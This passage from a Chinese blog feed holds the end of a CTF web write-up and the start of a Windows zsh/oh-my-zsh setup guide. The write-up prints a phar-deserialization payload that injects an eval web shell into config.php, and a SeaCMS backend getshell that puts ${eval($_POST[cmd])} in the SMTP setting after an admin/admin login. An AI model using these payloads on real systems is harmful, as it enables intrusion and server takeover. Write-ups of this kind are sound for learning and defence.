delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token function">upload_logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script&gt;alert(åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹./);history.go(-1)&lt;/script&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$footer</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></code></pre><p><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'header.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token delimiter important">?&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d-inline-block align-top<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">logo_url</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d-inline-block align-top<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">comment</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$footer</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè®¾ç½®äº† <code>img</code> å‚æ•°ï¼Œåˆ™ä¼šå»è¯»å–è¿™ä¸ªæ–‡ä»¶è¾“å‡ºåˆ°é¡µé¢ä¸Šã€‚</p><p><code> class.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$title</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$comment</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$logo_url</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$title</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$comment</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$logo_url</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span><span class="token operator">=</span> <span class="token variable">$title</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">comment</span> <span class="token operator">=</span> <span class="token variable">$comment</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logo_url</span> <span class="token operator">=</span> <span class="token variable">$logo_url</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$path</span><span class="token operator">=</span><span class="token string single-quoted-string">'./static/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">;</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./static/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_title</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token variable">$comment</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">#åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹ã€‚</span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\$title=\'.*?\';/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$title='<span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\$comment=\'.*?\';/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\$commnet='<span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">comment</span></span>';"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'/config.php'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token variable">$config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></code></pre><p><code>__destruct</code> ææ„å‡½æ•°é‡Œä¼šå°†é…ç½®ä¿å­˜åˆ° <code>config.php</code> æ–‡ä»¶ä¸­ï¼Œè¦†ç›–æ‰å½“å‰é…ç½®ã€‚</p><p>äºæ˜¯å°± <strong>ç”¨ phar æ‰“ååºåˆ—åŒ–</strong></p><p>æ ¹æ®ä¸Šé¢çš„æºç å†™ payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$title</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$comment</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$logo_url</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">title</span><span class="token operator">=</span><span class="token string double-quoted-string">"';eval(\$_POST['a']);#"</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token delimiter important">?&gt;</span></span></code></pre><p>ç”Ÿæˆ phar ååœ¨ <code>admin.php</code> ä¸Šä¼ ã€‚</p><p>è€Œåè®¿é—® <code>index.php?img=phar://./static/xxxxxxxx.jpg/test.txt</code> è§¦å‘ååºåˆ—åŒ–ã€‚</p><p>å…¶ä¸­çš„ <code>xxxxxxxx</code> å¯ä»¥é€šè¿‡ header è¿”å›çš„ <code>Date</code> è½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œå†å– md5 æ¥è·å¾—ã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1609158265"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># string(32) "b6e6c77a88da0935b34610e53081acb6" </span></code></pre><p>æœ€ååœ¨ <code>config.php</code> ç”¨ä¸€å¥è¯æœ¨é©¬æ‹¿ flagã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/image-20201228203651237.png" alt="ä¿®æ”¹åçš„ config.php"></p><blockquote><p>BTW, <strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong><br> â‘  phar æ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯<br> â‘¡ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€<br> â‘¢ è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚<code>file_exists()</code>ï¼Œ<code>fopen()</code>ï¼Œ<code>file_get_contents()</code>ï¼Œ<code>file()</code><br> â‘¢ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</p><p><strong>References:</strong></p><p><a href="https://blog.csdn.net/silence1_/article/details/102683254">å…³äºpharååºåˆ—åŒ–â€”â€”BUUCTF-[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a></p><p><a href="https://www.freebuf.com/column/198945.html">PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar</a></p></blockquote><h3 id="å¤§å®¶ä¸€èµ·æ¥å®¡ä»£ç "><a href="#å¤§å®¶ä¸€èµ·æ¥å®¡ä»£ç " class="headerlink" title="å¤§å®¶ä¸€èµ·æ¥å®¡ä»£ç "></a>å¤§å®¶ä¸€èµ·æ¥å®¡ä»£ç </h3><blockquote><p>å°è·¯å­¦ä¼šäº†æ¸—é€åŸºç¡€ï¼Œçªç„¶æœ‰ä¸€å¤©ç‰¹åˆ«æ— èŠæƒ³è¦æ¸—é€ï¼Œå¥¹è¯·æ•™äº†æŸå¤§ä½¬ï¼Œå¤§ä½¬ä¸¢ç»™äº†å¥¹ä¸€ä¸ªç½‘ç«™åœ°å€å’Œç½‘ç«™æºç (<a href="http://www.zip),ç„¶å,ç„¶å,å°è·¯å°±å¼€å§‹äº†è‹¦é€¼çš„ä»£ç å®¡è®¡ä¹‹æ—…,è¶Šæ˜¯å®¡è¶Šæƒ³å’Œå‘¨å…¬çº¦ä¼š,å¿«æ¥æ•‘æ•‘å¥¹å§!!!/">www.zip)ï¼Œç„¶åï¼Œç„¶åï¼Œå°è·¯å°±å¼€å§‹äº†è‹¦é€¼çš„ä»£ç å®¡è®¡ä¹‹æ—…ï¼Œè¶Šæ˜¯å®¡è¶Šæƒ³å’Œå‘¨å…¬çº¦ä¼šï¼Œå¿«æ¥æ•‘æ•‘å¥¹å§ï¼ï¼ï¼</a></p></blockquote><p><code>www.zip</code> æºç æ³„éœ²</p><p><code>/adm1n</code> åå°å¼±å£ä»¤ç™»å½•</p><p>admin<br>admin</p><p><strong>æµ·æ´‹CMS</strong></p><p>æœ‰ä¸€å †æ´ï¼ˆ</p><p>å‘ç° GitHub ä¸Šæœ‰äººæäº† <strong>åå° getshell</strong> çš„ issueï¼š</p><p><a href="https://github.com/ciweiin/seacms/issues/11">https://github.com/ciweiin/seacms/issues/11</a></p><p>åœ¨ é‚®ä»¶æœåŠ¡å™¨è®¾ç½®è¿™é‡ŒæŠŠ SMTP åœ°å€è®¾ä¸º <code>${eval($_POST[cmd])}</code></p><p><img src="/2020/12/28/CTF_2020zongheng/upload_c8ff60c8b48152bfdc7db365cba018d5.png" alt="img"></p><p>è€Œååœ¨ <code>/data/admin/smtp.php</code> è·¯å¾„ä¸‹æ‰§è¡Œæœ¨é©¬æ‹¿ flag å³å¯ã€‚</p><p><img src="/2020/12/28/CTF_2020zongheng/upload_48999df9438701ff778625217c9284aa.png" alt="flag"></p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å­¦åˆ°äº†ä¸å°‘å–µ~</p><p>BTWï¼Œè¿™æ¯”èµ›åˆ°æœ€åå¤§å®¶ç–¯ç‹‚äº¤ flagï¼Œå¤ªå·äº†å¤ªå·äº†ã€‚</p><p>å°±å…ˆè¿™æ ·å§ï¼Œè¿™å‡ å¤©è¦å¤§é™æ¸©äº†ï¼Œæ³¨æ„ä¿æš–w</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install Terminal + git-bash + zsh + oh-my-zsh on Windows 10</title>
      <link href="2020/12/13/Server_Terminal_gitbash_zsh/"/>
      <url>2020/12/13/Server_Terminal_gitbash_zsh/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€ç›´ä»¥æ¥åœ¨ Windows 10 ä¸Šä¸€èˆ¬æ˜¯ç›´æ¥ç”¨è‡ªå¸¦çš„ cmd æˆ–è€… PowerShellï¼Œæ„Ÿè§‰ç•Œé¢æ˜¯æŒºä¸‘çš„ã€‚</p><p>å¦ä¸€æ–¹é¢åœ¨ Linux ç¯å¢ƒä¸‹ç”¨ zsh åŠ äº†è‡ªåŠ¨è¡¥å…¨ç”¨ç€å°±è´¼çˆ½ï¼Œäºæ˜¯å°±æƒ³åˆ°èƒ½ä¸èƒ½åœ¨ Windows ä¸‹ä¹Ÿæ•´ä¸ª zshã€‚</p><p>å¤§æ¦‚æœäº†ä¸€ä¸‹ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§é€‰æ‹©ã€‚</p><ul><li>WSL (Windows Subsystem for Linux, é€‚ç”¨äº Linux çš„ Windows å­ç³»ç»Ÿ) + zsh</li><li>CygWin + zsh</li><li>Git Bash + zsh</li></ul><p>ç”±äºå·²ç»é…äº†è™šæ‹Ÿæœºï¼Œåœ¨ Windows 10 ä¸Šä¸å¤§æƒ³ä¹Ÿæ‡’å¾—è£… WSL2<em>ï¼ˆè€Œä¸”è¿˜å ç”¨ä¸€å † Cç›˜ç©ºé—´æ— æ³•æ¥å—ï¼‰</em>ï¼Œè€Œ <strong>Git å¸¦æœ‰çš„ Bash æ„Ÿè§‰æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©</strong>ã€‚</p><p>äºæ˜¯æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œé…äº†ä¸ª <strong>Windows Terminal + git-bash + zsh + oh-my-zsh</strong>ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ„æ€ï¼Œè¿™é‡Œé¡ºä¾¿å°±æ¥è®°å½•ä¸€ä¸‹ã€‚</p><hr><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><h3 id="0x00-å®‰è£…-git-bash-for-windows"><a href="#0x00-å®‰è£…-git-bash-for-windows" class="headerlink" title="0x00 å®‰è£… git bash for windows"></a>0x00 å®‰è£… git bash for windows</h3><p>å®˜æ–¹ä¸‹è½½é“¾æ¥ï¼Œç‚¹å¼€å°±èƒ½å¼¹å‡ºä¸‹è½½ â†“</p><p><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p>å®‰è£…å°±ç•¥äº†ï¼Œå½“å‰çš„æœ€æ–°ç‰ˆæœ¬æ˜¯ <code>2.29.2</code>ã€‚å®‰è£…å®Œæˆåä¼šæœ‰ä¸ª git bash ç¨‹åºã€‚</p><p>ï¼ˆå•Šï¼Œæˆ‘å‘ç°å¿˜è®°æˆªå›¾äº†ï¼Œé—®é¢˜ä¸å¤§ï¼‰</p><p>è®°å¾—ç•™æ„ä¸€ä¸‹ Git çš„å®‰è£…ç›®å½•ï¼Œä¸‹é¢ä¼šç”¨åˆ°ã€‚</p><p>ä¾‹å¦‚æˆ‘å®‰è£…åœ¨ <code>D:\Program Files\Git</code>ã€‚</p><h3 id="0x01-å®‰è£…-zsh"><a href="#0x01-å®‰è£…-zsh" class="headerlink" title="0x01 å®‰è£… zsh"></a>0x01 å®‰è£… zsh</h3><blockquote><p><strong><em>Zsh</em></strong> is a shell designed for interactive use, although it is also a powerful scripting language.  Many of the useful features of <em>bash</em>, <em>ksh</em>, and <em>tcsh</em> were incorporated into zsh; many original features were added.  The <a href="http://zsh.sourceforge.net/Intro/intro_toc.html">introductory document</a> details some of the unique features of zsh.  It assumes basic knowledge of the standard UNIX shells; the intent is to show a reader already familiar with one of the other major shells what makes zsh more useful or more powerful.</p></blockquote><p>åœ¨ä¸‹é¢çš„ç½‘ç«™å¯ä»¥ä¸‹è½½åˆ°æœ€æ–°çš„ zsh å®‰è£…åŒ…ï¼š</p><p><a href="https://packages.msys2.org/package/zsh?repo=msys&amp;variant=x86_64">https://packages.msys2.org/package/zsh?repo=msys&amp;variant=x86_64</a></p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213174051162.png" alt="ä¸‹è½½zsh"></p><p>ä¸‹è½½å®Œæˆåè§£å‹å†è§£å‹ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å¦‚ä¸‹ã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213174241795.png" alt="æ–‡ä»¶å†…å®¹"></p><p>å°†è¿™äº›æ–‡ä»¶ç›´æ¥è§£å‹åˆ° Git çš„å®‰è£…ç›®å½•ä¸‹ï¼Œä¸ä¹‹å‰çš„æ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œå¯ä»¥ç†è§£ä¸ºæŠŠ zsh å½“ä½œ git bash çš„ä¸€ä¸ªè¡¥å……å®‰è£…åŒ…ã€‚</p><p>å®Œæˆåçš„æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213174609786.png" alt="åˆå¹¶åçš„æ•ˆæœ"></p><p>æ­¤æ—¶æˆ‘ä»¬æ‰“å¼€ git bashï¼Œæ•²ä¸‹ <code>zsh</code>ï¼Œ<del>ç¥å¥‡çš„åœºé¢å‡ºç°äº†</del> æˆ‘ä»¬å¹¶æ²¡æœ‰æˆåŠŸåˆ‡æ¢åˆ° zsh<em>ï¼ˆå½“ç„¶ä½ è¿›å…¥äº†å½“æˆ‘æ²¡è¯´</em></p><p><strong>è¿™å•¥å›äº‹å•Šï¼Ÿè¿™ä¸å¯¹åŠ²å•Šï¼</strong>æˆ‘ä»¬å›å»çœ‹çœ‹åˆå¹¶äº†ä»€ä¹ˆæ–‡ä»¶å§ã€‚</p><p>bash ä¼šè°ƒç”¨ <code>/usr/bin/</code> ä¸‹çš„å¯æ‰§è¡Œç¨‹åºï¼Œè€Œ zsh ä¹Ÿåœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213175240930.png"></p><p>å‘ç°è¿™ä¸ª <code>zsh.exe</code> æ–‡ä»¶å¤§å°ä¸º0ï¼Œæ„Ÿè§‰å¯èƒ½æ˜¯ä¸ªé“¾æ¥/å¿«æ·æ–¹å¼å•¥çš„ï¼Œä½†ä¸æ‡‚ä¸ºå•¥è¿™é‡Œç”¨ä¸é€šã€‚</p><p>è€ŒçœŸæ­£ç”¨åˆ°çš„æ˜¯è¿™ä¸ª <code>zsh-5.8.exe</code>ã€‚</p><p>äºæ˜¯æˆ‘ä»¬åˆ æ‰ <code>zsh.exe</code>ï¼ŒæŠŠ  <code>zsh-5.8.exe</code> æ›´åä¸º <code>zsh.exe</code> å°±å®Œäº‹äº†ã€‚</p><p>è¿™æ—¶å†å¯åŠ¨ git bashï¼Œæ•²ä¸‹ <code>zsh</code>ï¼Œå˜¿å˜¿ï¼Œç†Ÿæ‚‰çš„ zsh å‡ºæ¥äº†ï¼</p><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213175713252.png" alt="zsh"></p><p>å½“ç„¶è¿™é‡Œå¯èƒ½ä¼šæç¤ºéœ€è¦ä½ é…ç½®ä¸€ä¸‹ <code>.zshrc</code>ï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚</p><p>çœ‹ä¸€ä¸‹ zsh ç‰ˆæœ¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">zsh</span> --version</code></pre><p><img src="/2020/12/13/Server_Terminal_gitbash_zsh/image-20201213180053175.png" alt="zsh version"></p><h3 id="0x02-å®‰è£…-Oh-My-Zsh"><a href="#0x02-å®‰è£…-Oh-My-Zsh" class="headerlink" title="0x02 å®‰è£… Oh My Zsh"></a>0x02 å®‰è£… Oh My Zsh</h3><p>zsh éƒ½æœ‰äº†ï¼Œæ€ä¹ˆèƒ½ä¸ä¸Š oh my zsh å‘¢ã€‚</p><blockquote><p>Oh My Zsh is a delightful, open source, community-driven framework for managing your Zsh        configuration. It comes bundled with thousands of helpful functions, helpers, plugins, themes, and a few things that make you shoutâ€¦</p><p><strong>â€œOh My ZSH!â€</strong></p><p><strong>Official Website:</strong> <a href="http://ohmyz.sh/">http://ohmyz.sh</a></p><p><strong>GitHub repo:</strong> <a href="https://github.com/ohmyzsh/ohmyzsh">https://github.com/ohmyzsh/ohmyzsh</a></p></blockquote><p>åœ¨ zsh é‡Œæ‰§è¡Œï¼ˆcurlï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token comment"># æˆ–è€… </span><span class="token comment"># sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"</span></code></pre><p>æˆ–è€…ç”¨ wget</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">wget</span> https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -<span class="token variable">)</span></span>"</span></code></pre><p>å›½å†…ä¸‹è½½å¯èƒ½ä¼šä¸å¤§è¡Œ<em>ï¼ˆDNS æ±¡æŸ“ä¹‹ç±»çš„ï¼‰</em>ï¼Œé‚£å°±æŒ‚ä¸ª ladder 